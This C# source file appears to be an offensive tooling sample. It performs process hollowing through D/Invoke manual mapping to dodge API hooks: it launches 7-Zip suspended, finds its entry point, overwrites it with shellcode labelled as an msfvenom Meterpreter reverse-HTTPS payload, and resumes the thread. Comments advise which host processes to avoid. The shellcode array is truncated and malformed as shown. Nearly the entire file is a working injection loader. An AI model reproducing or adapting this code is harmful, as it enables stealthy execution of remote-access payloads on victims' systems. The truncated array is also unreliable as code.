using System;
using System.Runtime.InteropServices;
using System.IO;

namespace DInvoke_ProcessHollowing
{
    internal class Program
    {

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength => Marshal.SizeOf(this);
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [Flags]
        public enum PROCESS_CREATION_FLAGS : uint
        {
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SECURE_PROCESS = 0x00400000,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public delegate bool CreateProcessWD(
            [MarshalAs(UnmanagedType.LPWStr)] string lpApplicationName,
            [MarshalAs(UnmanagedType.LPWStr)] string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            [MarshalAs(UnmanagedType.Bool)] bool bInheritHandles,
            PROCESS_CREATION_FLAGS dwCreationFlags,
            IntPtr lpEnvironment,
            [MarshalAs(UnmanagedType.LPWStr)] string lpCurrentDirectory,
            ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr Reserved4;
        }
        internal enum PROCESS_INFORMATION_CLASS
        {
            ProcessBasicInformation = 0,
            ProcessDebugPort = 7,
            ProcessWow64Information = 26,
            ProcessImageFileName = 27,
            ProcessBreakOnTermination = 29,
            ProcessSubsystemInformation = 75
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 ZwQueryInformationProcessD(
            IntPtr hProcess,
            PROCESS_INFORMATION_CLASS procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            UInt32 ProcInfoLen,
            ref UInt32 retlen);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool ReadProcessMemoryD(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool WriteProcessMemoryD(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint ResumeThreadD(IntPtr hThread);



        static void Main(string[] args)
        {

            PE.PE_MANUAL_MAP kern32DLL = new PE.PE_MANUAL_MAP();
            kern32DLL = Map.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");

            PE.PE_MANUAL_MAP ntdllDLL = new PE.PE_MANUAL_MAP();
            ntdllDLL = Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");

            var pa = new SECURITY_ATTRIBUTES();
            var ta = new SECURITY_ATTRIBUTES();
            var si = new STARTUPINFOEX();
            si.StartupInfo.cb = (uint)Marshal.SizeOf(si);

            var pi = new PROCESS_INFORMATION();

            //Note the sixth value CREATE_SUSPENDED
            //According to https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags:
            //"The primary thread of the new process is created in a suspended state, and does not run until the ResumeThread function is called."
            //Avoid svchost.exe, explorer.exe etc
            object[] parameters = { @"C:\Program Files\7-Zip\7zFM.exe", null, pa, ta, true, (uint)PROCESS_CREATION_FLAGS.CREATE_SUSPENDED, IntPtr.Zero, Directory.GetCurrentDirectory(), si, pi};
            Generic.CallMappedDLLModuleExport(kern32DLL.PEINFO, kern32DLL.ModuleBase, "CreateProcessW", typeof(CreateProcessWD), parameters, false);

            //Since we are using dynamic invocation we have to repopulate the structure with the returned value from CreateProcessW
            pi = (PROCESS_INFORMATION)parameters[9];

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            //The third argument, bi (PROCESS_BASIC_INFORMATION) structure, will be populated with the PEB address           
            object[] zqparameters = { hProcess, 0, bi, (uint)(IntPtr.Size * 6), tmp };
            Generic.CallMappedDLLModuleExport(ntdllDLL.PEINFO, ntdllDLL.ModuleBase, "ZwQueryInformationProcess", typeof(ZwQueryInformationProcessD), zqparameters, false);

            //Again due to DInvoke we have to repopulate the structure with the returned value from ZwQueryInformationProcess
            bi = (PROCESS_BASIC_INFORMATION)zqparameters[2];
           
            //This is a pointer to the location where the process base address is stored           
            IntPtr PtrToProcBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            //We read the value pointed to by PtrToProcBase in order to get the process base address
            byte[] tempbuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            object[] rpparameters = { hProcess, PtrToProcBase, tempbuf, tempbuf.Length, nRead };
            Generic.CallMappedDLLModuleExport(kern32DLL.PEINFO, kern32DLL.ModuleBase, "ReadProcessMemory", typeof(ReadProcessMemoryD), rpparameters, false);

            IntPtr targetProcBase = (IntPtr)(BitConverter.ToInt64(tempbuf, 0));
           
           //We add 0x3C to the base address and read the value in order to get the offset of the PE headers from the process base address
            byte[] tempbuf1 = new byte[IntPtr.Size];
            object[] rp2parameters = { hProcess, targetProcBase + 0x3C, tempbuf1, tempbuf1.Length, nRead };
            Generic.CallMappedDLLModuleExport(kern32DLL.PEINFO, kern32DLL.ModuleBase, "ReadProcessMemory", typeof(ReadProcessMemoryD), rp2parameters, false);

            Int32 OffsetOfPEHeaders = BitConverter.ToInt32(tempbuf1, 0);

            // We add 0x28 to the PE headers and read the value in order to get the offset of the entry point
            byte[] tempbuf2 = new byte[IntPtr.Size];
            object[] rp3parameters = { hProcess, targetProcBase + OffsetOfPEHeaders + 0x28, tempbuf2, tempbuf2.Length, nRead };
            Generic.CallMappedDLLModuleExport(kern32DLL.PEINFO, kern32DLL.ModuleBase, "ReadProcessMemory", typeof(ReadProcessMemoryD), rp3parameters, false);

            uint OffsetOfEntryPoint = BitConverter.ToUInt32(tempbuf2, 0);

            //Now that we have the offset of the EntryPoint we can add it to the process base address to get the absolute address
            IntPtr pEntryPoint = (IntPtr)(OffsetOfEntryPoint + (UInt64)targetProcBase);

            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 -f csharp
            //TRUNCATED
            byte[] buf = new byte[740] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
            0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,
            0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b
            0xff,0xd5};
            
            object[] wpparameters = { hProcess, pEntryPoint, buf, buf.Length, nRead };
            Generic.CallMappedDLLModuleExport(kern32DLL.PEINFO, kern32DLL.ModuleBase, "WriteProcessMemory", typeof(WriteProcessMemoryD), wpparameters, false);

            //Resume thread will essentially invoke the shellcode
            object[] rtparameters = { pi.hThread };
            Generic.CallMappedDLLModuleExport(kern32DLL.PEINFO, kern32DLL.ModuleBase, "ResumeThread", typeof(ResumeThreadD), rtparameters, false);

            Console.ReadLine();
        }
    }
}
